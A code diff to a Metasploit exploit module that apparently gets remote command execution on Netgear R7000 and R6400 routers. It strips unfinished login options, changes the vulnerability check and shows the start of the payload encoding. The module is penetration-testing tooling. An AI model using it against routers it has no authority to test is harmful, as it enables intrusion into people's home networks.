@@ -37,19 +37,12 @@ class MetasploitModule < Msf:Exploit::Remote
 
     register_options(
       [
-        OptString.new('CMD',        [true, 'Command line to execute', nil ]),
-        OptBool.new('ATTEMPTLOGIN', [false, 'Attempt to use USER and PASS for advanced fingerprinting', false]),
-        OptString.new('USER', [false, 'Username to log in with (only if ATTEMPTLOGIN is true)', nil]),
-        OptString.new('PASS', [false, 'Password to log in with (only if ATTEMPTLOGIN is true)', nil])
+        OptString.new('CMD',        [true, 'Command line to execute', nil ])
       ], self.class)
     end
 
-  # TODO finish optional login
   # Requests the login page which discloses the hardware, if it's an R7000 or R6400, return Detected
   def check
-
-    user = datastore['USER']
-    pass = datastore['PASS']
     res = send_request_cgi({'uri'=>'/'})
     if res.nil?
       fail_with(Failure::Unreachable, 'Connection timed out.')
@@ -75,7 +68,7 @@ class MetasploitModule < Msf:Exploit::Remote
   # Mostly from ddwrt_cgibin_exec.rb, maybe change some stuff idk
   def exploit
     is_vuln = check
-    if is_vuln == CheckCode::Safe
+    if is_vuln != CheckCode::Detected
       return
     end
     cmd = payload.encoded.unpack("C*").map{|c| "\\x%.2x" % c}.join
